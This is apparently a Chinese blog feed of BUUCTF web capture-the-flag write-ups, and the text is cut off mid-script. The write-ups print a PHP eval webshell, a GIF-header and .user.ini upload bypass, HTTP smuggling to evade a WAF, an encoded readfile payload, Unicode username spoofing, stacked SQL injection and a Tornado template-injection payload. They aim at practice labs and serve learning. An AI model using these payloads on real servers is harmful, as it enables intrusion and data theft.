        <content type="html"><![CDATA[<p>打开环境，是一个文件上传页面<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/1.jpg" alt=""></p><a id="more"></a><p>先查看一下源代码，看看有没有客户端校验<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/7.jpg" alt=""><br>显然没有客户端校验<br>首先上传一个图片，检查上传功能<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/2.jpg" alt=""><br>图片正常上传<br>接下来再上传一个php文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/3.jpg" alt=""><br>提示非法后缀<br>那么应该是不能接受php后缀的文件了，我们把后缀改成jpg试一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/8.jpg" alt=""><br>我把content-type字段和后缀名都改了一下<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/9.jpg" alt=""><br>但依然无法上传，提示检测到了非法字符<br>那我们再把一句话换一种写法</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>继续上传<br>得到了这样的反馈<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/10.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">exif_imagetype<span class="token punctuation">(</span><span class="token punctuation">)</span> 读取一个图像的第一个字节并检查其签名。</code></pre><p>这里是有文件内容头校验<br>不同的图片形式的文件头如下</p><pre class=" language-bash"><code class="language-bash">JPG ：FF D8 FF E0 00 10 4A 46 49 46GIF<span class="token punctuation">(</span>相当于文本的GIF89a<span class="token punctuation">)</span>：47 49 46 38 39 61PNG： 89 50 4E 47</code></pre><p>给我们的shell加上GIF文件的文件头，继续上传<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/11.jpg" alt=""><br>上传成功<br>但上传成功了该如何利用呢，图片马需要有文件包含漏洞或者解析漏洞才能够利用，但这道题并没有相应的漏洞<br>接下来就是我从这道题里面学到的新姿势了<br>先贴上P牛的链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/12.jpg" alt=""><br>而.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置<br>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件<br>所以，我们能轻易地用.user.ini文件构造出一个PHP后门<br>Php配置项中有两个比较有意思的项<br>auto_append_file、auto_prepend_file<br>其中auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_append_file则是在文件后面包含<br>也就是说，.user.ini文件相当于创造了文件包含的机会<br>用法也简单，直接写入.user.ini文件即可</p><p>所以，本题中，我们只需要先创建一个.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/13.jpg" alt=""><br>同样需要在.user.ini文件前加入GIF文件头<br>再创建一个图片马<br>可以使用copy命令</p><pre class=" language-bash"><code class="language-bash">copy shell.jpg/b+shell.php/a shell.jpg</code></pre><p>也可以使用一个叫edjpgcom的工具来生成图片马</p><p>首先上传我们的.user.ini文件<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/14.jpg" alt=""><br>然后上传图片马<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/15.jpg" alt=""><br>访问一下上传的位置<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/16.jpg" alt=""><br>蚁剑连接<br><img src="/LawlietLW.github.io/2019/12/23/buuctf-checkin/17.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> .user.ini文件的利用，文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Easy Calc</title>
      <link href="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/"/>
      <url>/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/1.jpg" alt=""></p><a id="more"></a><p>查看源代码</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>I've <span class="token keyword">set</span> up WAF to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>答案:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>有一个<code>calc.php</code>,跟进去看看<br>发现waf代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>waf过滤了’ ‘,’\t’,’\r’,’\n’,’'‘,’”‘,’`’,’[‘,’]’,’$’,’'<br>其中以get方式给num传参</p><p>由于前端设置了waf，所以只要我们的访问请求中包含非法字符就会返回403，无法访问到后端<br>在这样的情况下我们就可以使用HTTP走私来绕过前端waf直接访问后端</p><p>关于HTTP走私的介绍网上有许多师傅做了讲解，在这里就不多叙述了<br>(HTTP走私)[<a href="https://xz.aliyun.com/t/6654]" target="_blank" rel="noopener">https://xz.aliyun.com/t/6654]</a><br>(http请求走私(HTTP Request Smuggling))[<a href="https://blog.csdn.net/qq_37865996/article/details/102529396]" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/article/details/102529396]</a><br>贴两个链接</p><p>在这里，我们可以使用CL-CL方式来进行http走私，当然其他的方式也一样可以<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/2.jpg" alt=""><br>前端服务器读取完num=1之后，将数据包原封不动地转发给后端，后端读取到<code>?num=phpinfo()</code>后，返回给我们<code>phpinfo()</code><br>在这一题里有几个PHP函数需要我们注意</p><pre class=" language-bash"><code class="language-bash">scandir<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数返回指定目录中的文件和目录的数组。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span>函数：var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数用于输出变量的相关信息。var_dump<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过 @readfile<span class="token punctuation">(</span><span class="token punctuation">)</span> 形式调用该函数，来隐藏错误信息。</code></pre><p>我们可以使用<code>scandir("\")</code>来扫描根目录，但””被禁了，所以这样子不行，我们可以把\转为ASCII码，然后再转为字符，</p><pre class=" language-bash"><code class="language-bash">chr<span class="token punctuation">(</span><span class="token punctuation">)</span>chr<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</code></pre><p>所以我们可以构造成<code>scandir(chr(47))</code>来扫描根目录<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/3.jpg" alt=""><br>找到了flag存放的目录<br>接下来，我们需要从f1agg目录中读取flag<br>构造payload</p><pre class=" language-bash"><code class="language-bash">?num<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>47<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>102<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>49<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>97<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">)</span>.chr<span class="token punctuation">(</span>103<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>就是/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/4.jpg" alt=""><br>flag到手</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> http走私 </tag>
            
            <tag> PHP的字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF admin</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-admin/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-admin/</url>
      
        <content type="html"><![CDATA[<p>打开环境，有注册和登录两个功能<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/1.jpg" alt=""></p><a id="more"></a><p>查看源代码，看到提示<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/2.jpg" alt=""><br>猜测需要以admin账号登陆才能拿到flag<br>那么先注册一个账号看看(admin账号已被注册)<br>注册账号后一共有四个选项<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/3.jpg" alt=""><br>首先看到post功能<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/4.jpg" alt=""><br>一个编辑留言的地方，可能会有xss之类的漏洞？我不太清楚，因为我目前并不会xss<br>再看到change password功能，查看源代码<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/5.jpg" alt=""><br>给出了源代码的GitHub地址<br>那就过去看看<br>分析routes.py<br>路由的功能不多，注册，登录，登出，编辑和修改密码</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>从注册开始分析<br>注意到接收username这里使用了一个<code>strlower</code>函数<br>看起来是使字符串小写的函数，但python内置<code>lower()</code>函数，为什么要自己写一个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>事实上，不止注册这里，登录和修改密码处同样使用了<code>strlower</code>函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>那我们就去看看这个<code>strlower</code>函数是什么样的</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这里面使用了nodeprep.prepare()函数，这个函数对应的库是twisted<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/7.jpg" alt=""><br>这么一对比，发现源码中使用的twisted库的版本实在太低了<br><a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考这篇文章</a><br>这样一来我们就能形成一个攻击链<br>登陆时会调用一次<code>strlower</code>，修改密码时又会调用一次<code>strlower</code>，只要我们的用户名经过两次调用后变成了admin，我们就可以修改admin用户的密码然后重新登陆了</p><pre class=" language-bash"><code class="language-bash">ᴬᴰᴹᴵᴺ -<span class="token operator">></span> ADMIN -<span class="token operator">></span> admin</code></pre><p>admin的Unicode编码可以在网上找到<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/8.jpg" alt=""><br>成功拿到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Unicode欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF EasySQL</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/</url>
      
        <content type="html"><![CDATA[<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/1.jpg" alt=""></p><a id="more"></a><p>这题和强网杯随便注一样，都是堆叠注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/3.jpg" alt=""><br>通过show tables可以看到Flag表<br>但想要看到列就不行了<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/4.jpg" alt=""><br>通过burpfuzz一下，能看到过滤了挺多关键字的</p><hr><p>有点难顶，只能看wp了</p><pre class=" language-sql"><code class="language-sql">官方解:<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span></code></pre><p>而这道题的sql语句是这样的</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> $post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>拼接一下就变成了这样</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">set</span> sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>关于 sql_mode :<br>它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 “或” 运算符<br><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode 说明</a><br>所以，当set sql_mode=pipes_as_concat执行后，会把select 1和select flag的结果拼接起来<br>老实说，我实在想不出来这题的sql语句竟然是这样的<br>还是我太菜了<br>所以我更倾向于非预期解</p><pre class=" language-bash"><code class="language-bash">*,1</code></pre><p>拼接到sql语句中就是</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">||</span>flag <span class="token keyword">from</span> Flag</code></pre><p>这样就是选择所有，一样能爆flag</p><p>总的来说，无论是官方解还是非预期解，我都能从中学到一些东西，一个扩宽知识面，一个开阔思路</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> mysql_sql_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF easy_tornado</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p><a id="more"></a><p>有三个页面，挨个访问看看</p><pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p><pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p><pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre><p>也就是filename的md5值加上cookie_secret再md5<br>我们想要进入到fllllllllllllag，filename已经知道了，剩下cookie_secret不知道<br>在测试的过程中，会出现这样一个页面</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre><p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>得到cookie_secret</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre><p>然后写一个脚本得到最后的filehash</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token 